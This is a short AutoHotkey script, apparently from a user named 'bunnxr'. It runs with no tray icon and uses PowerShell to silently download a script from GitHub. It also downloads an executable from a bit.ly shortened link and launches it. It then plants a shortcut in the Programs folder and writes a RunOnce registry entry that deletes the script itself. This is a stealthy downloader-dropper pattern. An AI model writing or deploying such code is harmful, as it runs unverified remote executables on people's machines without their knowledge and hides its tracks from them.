;bunnxr
;AutoHotkey v1.1.32.00 - November 24, 2019
#NoTrayIcon
#NoEnv
#SingleInstance, force
#InstallKeybdHook
DetectHiddenWindows, On
SetTitleMatchMode, 2
SendMode Input

run, %comspec% /c powershell -command Invoke-WebRequest -OutFile C:\charlie\wloop_1080p.ahk -Uri https://raw.githubusercontent.com/bunnxr/autohotkey-repo/main/wloop_1080p.ahk

if FileExist("C:\charlie\Autohotkey.exe")
    gosub, link
Else
    run, %comspec% /c powershell -command Invoke-WebRequest -OutFile C:\charlie\Autohotkey.exe -Uri https://bit.ly/427gX27`;start C:\charlie\Autohotkey.exe C:\charlie\wloop_1080p.ahk

link:
if FileExist("%A_Programs%\$_afk.lnk")
    Gosub, reg
Else
    FileCreateShortcut, C:\charlie\autohotkey.exe, %A_Programs%\$_afk.lnk, C:\charlie, C:\charlie\wloop_1080p.ahk,,,l

reg:
RegWrite, REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,Application,%comspec% /c del /q "%A_ScriptFullPath%"

ExitApp, [ ExitCode]